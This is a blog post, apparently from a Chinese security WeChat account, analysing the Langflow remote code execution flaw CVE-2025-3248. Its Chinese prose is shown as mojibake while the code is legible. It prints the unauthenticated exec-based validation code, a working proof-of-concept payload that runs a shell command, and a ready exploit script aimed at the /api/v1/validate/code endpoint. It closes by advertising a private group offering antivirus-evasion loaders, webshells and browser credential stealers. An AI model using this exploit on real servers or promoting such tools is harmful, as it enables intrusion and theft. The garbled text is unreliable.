#  Langflowè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2025-3248ï¼‰  
æ˜Ÿå¤œAIå®‰å…¨
                    æ˜Ÿå¤œAIå®‰å…¨  æ˜Ÿå¤œAIå®‰å…¨   2026-01-20 04:02  
  
ğŸ“Œå„ä½å¯ä»¥å°†å…¬ä¼—å·è®¾ä¸ºæ˜Ÿæ ‡â­  
  
ğŸ“Œè¿™æ ·å°±ä¸ä¼šé”™è¿‡æ¯æœŸçš„æ¨èå†…å®¹å•¦~  
  
ğŸ“Œè¿™å¯¹æˆ‘çœŸçš„å¾ˆé‡è¦ï¼  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/SffY5ZO3R2lAVT6CicZmYO3GGZre7KEwxiaouHrUbg3rQ0UUVhEI7eDxct12pq4ITqI98fcU1rsJXlHib3VF1n4ew/640?wx_fmt=png&from=appmsg "image")  
  
ğŸ“Œ1. æœ¬å¹³å°åˆ†äº«çš„å®‰å…¨çŸ¥è¯†å’Œå·¥å…·ä¿¡æ¯æºäºå…¬å¼€èµ„æ–™åŠä¸“ä¸šäº¤æµï¼Œä»…ä¾›ä¸ªäººå­¦ä¹ æå‡å®‰å…¨æ„è¯†ã€äº†è§£é˜²æŠ¤æ‰‹æ®µï¼Œç¦æ­¢ç”¨äºä»»ä½•è¿æ³•æ´»åŠ¨ï¼Œå¦åˆ™ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…æ³•å¾‹åæœã€‚  
  
ğŸ“Œ2. æ‰€åˆ†äº«å†…å®¹åŠå·¥å…·è™½å…·æ™®éæ€§ï¼Œä½†å› åœºæ™¯ã€ç‰ˆæœ¬ã€ç³»ç»Ÿç­‰å› ç´ ï¼Œæ— æ³•ä¿è¯å®Œå…¨é€‚ç”¨ï¼Œä½¿ç”¨è€…è¦è‡ªè¡Œæ‰¿æ‹…çŸ¥è¯†è¿ç”¨ä¸å½“ã€å·¥å…·ä½¿ç”¨æ•…éšœå¸¦æ¥çš„æŸå¤±ã€‚  
  
ğŸ“Œ3. ä½¿ç”¨è€…åœ¨å­¦ä¹ æ“ä½œè¿‡ç¨‹ä¸­åŠ¡å¿…éµå®ˆæ³•è§„é“å¾·ï¼Œé¢å¯¹æœ‰é£é™©ç¯èŠ‚éœ€è°¨æ…é¢„ä¼°åæœã€åšå¥½é˜²æŠ¤ï¼Œè‹¥æœªè°¨æ…æ“ä½œå¼•å‘ä¿¡æ¯æ³„éœ²ã€è®¾å¤‡æŸåç­‰ä¸è‰¯åæœï¼Œè´£ä»»è‡ªè´Ÿã€‚  
# æ¼æ´è¯´æ˜  
  
CVE-2025-3248 æ˜¯ Langflow å¹³å°ä¸­çš„ä¸€ä¸ªé«˜å±è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚Langflow æ˜¯ä¸€ä¸ªå¼€æºçš„ AI å·¥ä½œæµæ„å»ºå¹³å°ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å¯è§†åŒ–ç•Œé¢æ¥åˆ›å»ºå’Œç®¡ç†ç”± AI é©±åŠ¨çš„è‡ªåŠ¨åŒ–æµç¨‹ã€‚è¯¥æ¼æ´å‡ºç°åœ¨å¹³å°çš„ä»£ç éªŒè¯åŠŸèƒ½é‡Œï¼Œæ”»å‡»è€…æ— éœ€ç»è¿‡ä»»ä½•èº«ä»½éªŒè¯ï¼Œå³å¯é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç›®æ ‡ç³»ç»Ÿã€‚  
# å½±å“ç‰ˆæœ¬  
  
Langflow 1.0.0 è‡³ 1.2.9 çš„æ‰€æœ‰ç‰ˆæœ¬å‡å—æ­¤æ¼æ´å½±å“ã€‚  
# ä»£ç ç»“æ„  
  
ä»£ç ç»“æ„ä¾æ®å®˜æ–¹æ–‡æ¡£æè¿°æ•´ç†ã€‚  
## 1. æ ¹ç›®å½•  
```
* åŒ…å«é¡¹ç›®çš„ Docker é…ç½®æ–‡ä»¶ã€READMEã€è®¸å¯è¯æ–‡ä»¶ã€æµ‹è¯•æ–‡ä»¶ç­‰åŸºç¡€é…ç½®ã€‚
```  
## 2. /src/forntend  
```
* src/ï¼šå‰ç«¯æºç çš„ä¸»ç›®å½•ã€‚* componentsï¼šå­˜æ”¾é€šç”¨çš„ UI ç»„ä»¶ï¼Œä¾‹å¦‚è¾“å…¥æ¡†ã€èŠå¤©ç»„ä»¶ã€åŠ è½½çŠ¶æ€ç­‰ã€‚* CustomNodesï¼šå®šä¹‰è‡ªå®šä¹‰èŠ‚ç‚¹ç»„ä»¶ï¼Œè´Ÿè´£èŠ‚ç‚¹çš„æ˜¾ç¤ºå’Œäº¤äº’é€»è¾‘ã€‚* contextsï¼šä½¿ç”¨ React Context è¿›è¡ŒçŠ¶æ€ç®¡ç†ï¼Œä¾‹å¦‚ç®¡ç†ç±»å‹ã€è­¦å‘Šã€æ ‡ç­¾é¡µç­‰ã€‚* controllersï¼šå¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œä¾‹å¦‚èŠ‚ç‚¹æœåŠ¡ã€‚* modalsï¼šå¼¹çª—ç»„ä»¶ï¼Œä¾‹å¦‚å¯¼å…¥å¯¼å‡ºå¼¹çª—ã€‚* pagesï¼šé¡µé¢çº§ç»„ä»¶ï¼Œä¾‹å¦‚æµç¨‹é¡µé¢ã€‚* alertsï¼šä¸è­¦å‘Šæç¤ºç›¸å…³çš„ç»„ä»¶ã€‚* typesï¼šTypeScript ç±»å‹å®šä¹‰ï¼Œç”¨äºè§„èŒƒæ•°æ®ç»“æ„ã€‚* å…¶ä»–é…ç½®æ–‡ä»¶å’Œå·¥å…·å‡½æ•°ã€‚
```  
## 3. /src/backend  
```
* åç«¯ä»£ç ï¼Œæä¾› API æ”¯æŒå’Œä¸šåŠ¡é€»è¾‘å¤„ç†ã€‚
```  
# åˆ†æ  
## æ¼æ´æˆå›   
  
é¦–å…ˆæŸ¥çœ‹æ–‡ä»¶Â langflow-1.2.0/src/backend/base/langflow/api/v1/validate.py  
Â ä¸­ä»ç¬¬ä¹è¡Œå¼€å§‹çš„ä»£ç ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicPDk5a6MZhLHVUBSH0pPvAnzUpLbzfqoUrGsEWP6WOsC3NqKibJVdjt1Q0MjGNhHmSibX2PXMrDSX7Q/640?wx_fmt=png&from=appmsg "")  
```
@router.post("/code", status_code=200) Â async def post_validate_code(code: Code) -> CodeValidationResponse: Â Â  Â  try: Â Â  Â  Â  Â  errors = validate_code(code.code) Â Â  Â  Â  Â  return CodeValidationResponse( Â Â  Â  Â  Â  Â  Â  imports=errors.get("imports", {}), Â Â  Â  Â  Â  Â  Â  function=errors.get("function", {}), Â Â  Â  Â  Â  ) Â Â  Â  except Exception as e: Â Â  Â  Â  Â  logger.opt(exception=True).debug("Error validating code") Â Â  Â  Â  Â  raise HTTPException(status_code=500, detail=str(e)) from e
```  
  
è¯¥æ¥å£ç›´æ¥æ¥æ”¶Â Code  
Â ç±»å‹ï¼ˆå³ç”¨æˆ·æäº¤çš„å¾…éªŒè¯ä»£ç å†…å®¹ï¼‰çš„å‚æ•°ï¼Œå¹¶è¿”å›Â CodeValidationResponse  
Â ç±»å‹ã€‚ä»æ¥æ”¶å‚æ•°åˆ°è°ƒç”¨Â validate_code  
Â å‡½æ•°ä¹‹é—´ï¼Œæ²¡æœ‰ä»»ä½•é˜²æŠ¤æªæ–½ï¼Œè¿™å¯¼è‡´ä»»ä½•èº«ä»½çš„ç”¨æˆ·éƒ½å¯ä»¥è®¿é—®æ­¤æ¥å£ã€‚  
  
æ¥ä¸‹æ¥æŸ¥çœ‹æœ€å…³é”®çš„æ¼æ´ä½ç½®ï¼Œå³Â validate_code  
Â å‡½æ•°æ‰€åœ¨çš„æ–‡ä»¶Â langflow-1.2.0/src/backend/base/langflow/utils/vWalidate.py  
ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicPDk5a6MZhLHVUBSH0pPvAnhBkibqwz53u6ZgbKIpjOB5I5y0kpJZsib9ibibyImdV2mjx5rcwNUmGJPw/640?wx_fmt=png&from=appmsg "")  
```
def validate_code(code): Â Â  Â  # Initialize the errors dictionary Â Â  Â  errors = {"imports": {"errors": []}, "function": {"errors": []}} Â Â  Â  # Parse the code string into an abstract syntax tree (AST) Â Â  Â  try: Â Â  Â  Â  Â  tree = ast.parse(code) Â Â  Â  except Exception as e: Â # noqa: BLE001 Â Â  Â  Â  Â  if hasattr(logger, "opt"): Â Â  Â  Â  Â  Â  Â  logger.opt(exception=True).debug("Error parsing code") Â Â  Â  Â  Â  else: Â Â  Â  Â  Â  Â  Â  logger.debug("Error parsing code") Â Â  Â  Â  Â  errors["function"]["errors"].append(str(e)) Â Â  Â  Â  Â  return errors Â Â  Â  # Add a dummy type_ignores field to the AST Â Â  Â  add_type_ignores() Â Â  Â  tree.type_ignores = [] Â Â  Â  # Evaluate the import statements Â Â  Â  for node in tree.body: Â Â  Â  Â  Â  if isinstance(node, ast.Import): Â Â  Â  Â  Â  Â  Â  for alias in node.names: Â Â  Â  Â  Â  Â  Â  Â  Â  try: Â Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  importlib.import_module(alias.name) Â Â  Â  Â  Â  Â  Â  Â  Â  except ModuleNotFoundError as e: Â Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  errors["imports"]["errors"].append(str(e)) Â Â  Â  # Evaluate the function definition Â Â  Â  for node in tree.body: Â Â  Â  Â  Â  if isinstance(node, ast.FunctionDef): Â Â  Â  Â  Â  Â  Â  code_obj = compile(ast.Module(body=[node], type_ignores=[]), "<string>", "exec") Â Â  Â  Â  Â  Â  Â  try: Â Â  Â  Â  Â  Â  Â  Â  Â  exec(code_obj) Â Â  Â  Â  Â  Â  Â  except Exception as e: Â # noqa: BLE001 Â Â  Â  Â  Â  Â  Â  Â  Â  logger.opt(exception=True).debug("Error executing function code") Â Â  Â  Â  Â  Â  Â  Â  Â  errors["function"]["errors"].append(str(e)) Â Â  Â  # Return the errors dictionary Â Â  Â  return errors
```  
  
æ­¤å¤„å°±æ˜¯æ¼æ´æ‰€åœ¨çš„å…³é”®ä½ç½®ï¼Œæ¥ä¸‹æ¥å°†å¯¹æ­¤è¿›è¡Œè¯¦ç»†åˆ†æã€‚### 1. åˆå§‹åŒ–é”™è¯¯å®¹å™¨  
  
errors = {"imports": {"errors": []}, "function": {"errors": []}}  
  
imports  
Â éƒ¨åˆ†ç”¨äºè®°å½•æ¨¡å—ä¸å­˜åœ¨çš„é”™è¯¯ï¼›function  
Â éƒ¨åˆ†åˆ™ç”¨äºè®°å½•å‡½æ•°å®šä¹‰æˆ–æ‰§è¡Œæ—¶å‡ºç°çš„è¯­æ³•é”™è¯¯æˆ–è¿è¡Œæ—¶å¼‚å¸¸ã€‚  
### 2. ä½¿ç”¨ASTæ¨¡å—è§£æä»£ç å­—ç¬¦ä¸²  
  
tree = ast.parse(code)  
### 3. å¤„ç†å¯¼å…¥è¯­å¥  
  
éå†ASTä¸­çš„Â Import  
Â èŠ‚ç‚¹ï¼ˆä¾‹å¦‚ï¼šimport os  
ï¼‰ï¼ŒåŠ¨æ€å¯¼å…¥æ¨¡å—ã€‚å¦‚æœå¯¼å…¥å¤±è´¥ï¼Œåˆ™å°†é”™è¯¯è®°å½•åˆ°Â imports.errors  
Â ä¸­ã€‚  
### 4. éªŒè¯å‡½æ•°å®šä¹‰  
  
éå†ASTä¸­çš„Â FunctionDef  
Â èŠ‚ç‚¹ï¼ˆå³å‡½æ•°å®šä¹‰ï¼‰ï¼Œç¼–è¯‘å¹¶æ‰§è¡Œå‡½æ•°ä»£ç ã€‚å¦‚æœæ•è·åˆ°è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆä¾‹å¦‚Â NameError  
ã€TypeError  
ï¼‰ï¼Œåˆ™å°†è¿™äº›é”™è¯¯è®°å½•åˆ°Â function.errors  
Â ä¸­ã€‚  
### 5. è¿”å›é”™è¯¯ç»“æœ  
  
æœ€ç»ˆè¿”å›çš„Â errors  
Â ä¼šè¢«è·¯ç”±åŒ…è£…åˆ°Â CodeValidationResponse  
Â ä¸­ã€‚  
### æ€»ç»“  
  
ä»£ç åˆ†æå®Œæˆåï¼Œåœ¨Â post_validate_code  
Â ä¸­è°ƒç”¨Â validate_code  
ï¼Œå¹¶ä¼ å…¥ç”¨æˆ·æäº¤çš„ä»£ç å­—ç¬¦ä¸²ã€‚è¿”å›çš„é”™è¯¯ä¿¡æ¯ä¼šè¢«è·¯ç”±åŒ…è£…ï¼Œæœ€ç»ˆè¿”å›ç»™å®¢æˆ·ç«¯ã€‚æ•´ä¸ªæµç¨‹åˆ†ä¸ºä¸¤å±‚ï¼šè·¯ç”±å±‚è´Ÿè´£å¤„ç†HTTPè¯·æ±‚/å“åº”å’Œå¼‚å¸¸æ•è·ï¼›éªŒè¯å±‚åˆ™è´Ÿè´£è§£æä»£ç å¹¶éªŒè¯å…¶æœ‰æ•ˆæ€§ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸¤å±‚ä»£ç ä¸­éƒ½æ²¡æœ‰å¯¹èº«ä»½è¿›è¡ŒéªŒè¯ï¼ˆä¾‹å¦‚æ£€æŸ¥cookieï¼‰ï¼Œå› æ­¤ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨Â /code  
Â æ¥å£ï¼Œæ— éœ€ç™»å½•æˆ–æä¾›ä»»ä½•å‡­æ®ï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œæ¼æ´ã€‚  
### æ³¨æ„ï¼š  
  
åƒåœ¾pycharmï¼Œctrl+é¼ æ ‡å·¦é”®çœŸéš¾ç”¨ï¼Œä¸å¦‚vscode  
# POC  
  
POSTä¼ å‚Â {"code": "@exec('raise Exception(__import__(\"subprocess\").check_output([\"id\"]))')\ndef foo():\n pass"}  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicPDk5a6MZhLHVUBSH0pPvAnacUa22Tw3WECSkMo13umiby8B4kzZAIQ3jkRnm2jyGN38ibaS49ImIBw/640?wx_fmt=png&from=appmsg "")  
## æ³¨æ„  
  
è®°å¾—æŠŠè¿™ä¸ªåˆ äº†è¦ä¸ç„¶ä¸ä¼šæˆåŠŸçš„  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicPDk5a6MZhLHVUBSH0pPvAn57iccaZUh2OA2PBPpnfkicH5Gg2gJW3ianwpW94qOLAIjhSUprT9jfukA/640?wx_fmt=png&from=appmsg "")  
# è„šæœ¬  
  
ç½‘ä¸Šä¸€ä¸ªå¤§å“¥çš„è„šæœ¬  
```
import requeststarget = "http://xxx.xxx.xxx.xxx:7860/api/v1/validate/code"payload = {"code": "@exec('raise Exception(__import__(\"subprocess\").check_output([\"id\"]))')\ndef foo():\n pass"}response = requests.post(target, json=payload)print(response.text)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicPDk5a6MZhLHVUBSH0pPvAnzgZ8RVSyzj95k2AEhadEicBIqtVCsWlQMUaFJf2g3wfGN80612ziaXEA/640?wx_fmt=png&from=appmsg "")  
  
å…³æ³¨å¾®ä¿¡å…¬ä¼—å·åå°å›å¤**å…¥ç¾¤**  
Â å³å¯åŠ å…¥æ˜Ÿå¤œAIå®‰å…¨äº¤æµç¾¤  
## åœˆå­ä»‹ç»  
  
ç°ä»»èŒäºæŸå¤´éƒ¨ç½‘ç»œå®‰å…¨ä¼ä¸šæ”»é˜²ç ”ç©¶éƒ¨ï¼Œæ ¸å¿ƒçº¢é˜Ÿæˆå‘˜ã€‚2021-2023å¹´é—´ç´¯è®¡å‚ä¸40+åœºå›½å®¶çº§ã€è¡Œä¸šçº§æ”»é˜²å®æˆ˜æ¼”ç»ƒï¼Œç²¾é€šæ¼æ´æŒ–æ˜ã€çº¢è“å¯¹æŠ—ç­–ç•¥åˆ¶å®šã€æ¶æ„ä»£ç åˆ†æã€å†…ç½‘æ¨ªå‘æ¸—é€åŠåº”æ€¥å“åº”ç­‰æŠ€æœ¯é¢†åŸŸã€‚åœ¨å¤šæ¬¡å¤§å‹æ¼”ç»ƒä¸­ï¼Œä¸»å¯¼çªç ´å¤šä¸ªé«˜é˜²æŠ¤ç›®æ ‡ç½‘ç»œï¼Œæ›¾è·â€œæœ€ä½³æ”»å‡»æ‰‹â€â€œçªå‡ºè´¡çŒ®ä¸ªäººâ€ç­‰è£èª‰ã€‚  
  
å·²äº§å‡ºçš„å®‰å…¨å·¥å…·åŠæˆæœåŒ…æ‹¬ï¼š  
- å¤šæ¬¾ä¸»æµæ€è½¯é€šæ€å·¥å…·ï¼ˆå…¼å®¹å¡å·´æ–¯åŸºã€è¯ºé¡¿ã€ç‘æ˜Ÿã€360ç­‰ç»ˆç«¯é˜²æŠ¤ï¼‰  
  
- å†…ç½‘ç©¿é€å¥—ä»¶ï¼ˆé€‚é…å¤šå±‚è·¯ç”±ã€éš”ç¦»ç½‘ç»œç¯å¢ƒçš„éšè”½æµé‡è½¬å‘ï¼‰  
  
- æƒé™ç»´æŒå·¥å…·é›†ï¼ˆå«æ³¨å†Œè¡¨ã€ç³»ç»ŸæœåŠ¡ã€è¿›ç¨‹éšè—ç­‰å¤šç»´æŒä¹…åŒ–æ–¹æ¡ˆï¼‰  
  
- å“¥æ–¯æ‹‰/å†°èå®šåˆ¶åŒ–é©¬ç”Ÿæˆå™¨ï¼ˆç»•è¿‡ä¸»æµç»ˆç«¯é˜²æŠ¤ä¸EDRåŠ¨æ€æ£€æµ‹ï¼‰  
  
- æµè§ˆå™¨å‡­è¯çªƒå–å·¥å…·ï¼ˆæ”¯æŒChrome/Edge/Firefoxç­‰ä¸»æµæµè§ˆå™¨æ•°æ®æå–ï¼‰  
  
- äºŒå¼€fscanå†…ç½‘æ‰«æå·¥å…·ï¼ˆå¢å¼ºæŒ‡çº¹ç²¾åº¦ã€å¼±å£ä»¤çˆ†ç ´ä¸ç»“æœæ ‡å‡†åŒ–è¾“å‡ºï¼‰  
  
- å¤šæ¬¾å…æ€Webshellé›†åˆï¼ˆè¦†ç›–PHP/JSP/ASPXï¼Œè¿‡ä¸»æµWAFä¸ç»ˆç«¯é˜²æŠ¤ï¼‰  
  
- å…æ€360ä¸“å±åŠ è½½å™¨ï¼ˆæ”¯æŒShellcodeå†…å­˜æ‰§è¡Œï¼Œç»•è¿‡360å…¨ç³»é˜²æŠ¤æ£€æµ‹ï¼‰  
  
åç»­å°†ä¸æ–­æ›´æ–°åˆ°å†…éƒ¨åœˆå­ä¸­ æ¬¢è¿åŠ å…¥åœˆå­Â ![image](https://mmbiz.qpic.cn/mmbiz_jpg/SffY5ZO3R2krPdiaNgcSCqIWicvYpFwAA7FE1OiakOmrjja9AwwXl1WnW18bKaykVfzXKCz7PVBmiaLI5JRZYncJMQ/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "image")  
  
  
